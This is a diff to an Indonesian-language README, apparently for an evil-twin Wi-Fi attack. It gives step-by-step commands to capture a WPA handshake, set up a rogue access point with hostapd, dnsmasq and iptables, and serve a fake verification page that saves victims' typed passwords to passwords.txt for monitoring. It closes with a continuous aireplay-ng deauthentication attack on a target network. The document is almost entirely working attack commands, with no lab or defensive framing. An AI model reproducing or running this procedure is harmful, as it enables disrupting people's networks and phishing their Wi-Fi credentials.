@@ -9,26 +9,26 @@ apt-get install aircrack-ng hostapd dnsmasq iptables apache2 php libapache2-mod-
 
 ## Langkah-Langkah
 
-#### Aktifkan Mode Monitor pada Interface Deauth
+#### Aktifkan Mode Monitor
 
 ```
 airmon-ng check kill
 airmon-ng start [interface_deauth]
 ```
 
-#### Scan Wi-Fi WPA/WPA-PSK
+#### Scan Wi-Fi WPA/WPA2-PSK
 
 ```
 airodump-ng --encrypt wpa [interface_deauth]
 ```
 
-#### Capture 4-Way Handshake
+#### Capture Handshake
 
 ```
 airodump-ng --bssid [bssid] --channel [channel] --write [output] [interface_deauth]
 ```
 
-#### Beri IP pada Interface AP
+#### Konfigurasi IP
 
 ```
 ip addr flush dev [interface_ap]
@@ -36,7 +36,7 @@ ip addr add 10.10.10.1/24 dev [interface_ap]
 ip link set [interface_ap] up
 ```
 
-#### Membuat Konfigurasi Hostapd
+#### Konfigurasi Hostapd
 
 ```
 nano hostapd.conf
@@ -54,13 +54,13 @@ auth_algs=1
 ignore_broadcast_ssid=0
 ```
 
-#### Membuat Konfigurasi DNSmasq
+#### Konfigurasi DNSmasq
 
 ```
 nano dnsmasq.conf
 ```
 
-Isi dengan
+Isi dengan:
 
 ```
 interface=[interface_ap]
@@ -72,7 +72,7 @@ no-resolv
 log-dhcp
 ```
 
-#### Konfigurasi NAT dan Port Forwarding dengan iptables
+#### Konfigurasi iptables
 
 ```
 iptables -F
@@ -86,22 +86,21 @@ iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
 iptables -t nat -L -n -v
 ```
 
-#### Membuat Backup dan Atur Permission Direktori Web
+#### Backup Direktori Web
 
 ```
 mkdir /var/www/html/backup
 mv /var/www/html/* /var/www/html/backup
-chmod -R 755 /var/www/html
 ```
 
-#### Salin File Web ke Direktori HTML
+#### Setup File Web
 
 ```
 cp conf/index.html /var/www/html
 cp conf/verifikasi.php /var/www/html
 ```
 
-#### Salin File Capture ke Direktori Web dan Atur Permission
+#### Setup File Capture
 
 ```
 cp [output]-01.cap /var/www/html/
@@ -109,22 +108,22 @@ chown root:www-data /var/www/html/[output]-01.cap
 chmod 640 /var/www/html/[output]-01.cap
 ```
 
-#### Buat File passwords.txt dan Atur Permission
+#### Setup File Password
 
 ```
 touch /var/www/html/passwords.txt
-chown root:www-data /var/www/html/passwords.txt
 chmod 660 /var/www/html/passwords.txt
+chown -R www-data:www-data /var/www/html
 ```
 
-#### Backup dan Ganti Konfigurasi Apache
+#### Konfigurasi Apache
 
 ```
 cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/000-default.conf.bak
 cp conf/apache2.conf /etc/apache2/sites-available/000-default.conf
 ```
 
-#### Aktifkan Modul Rewrite dan Restart Apache
+#### Aktifkan Apache Rewrite
 
 ```
 a2enmod rewrite
@@ -143,13 +142,13 @@ dnsmasq -C dnsmasq.conf -d
 hostapd hostapd.conf
 ```
 
-#### Monitoring Hasil
+#### Monitoring Password
 
 ```
 tail -f /var/www/html/passwords.txt
 ```
 
-#### Jalankan Serangan Deauth
+#### Jalankan Deauth Attack
 
 ```
 aireplay-ng -0 0 -a [bssid] [interface_deauth]
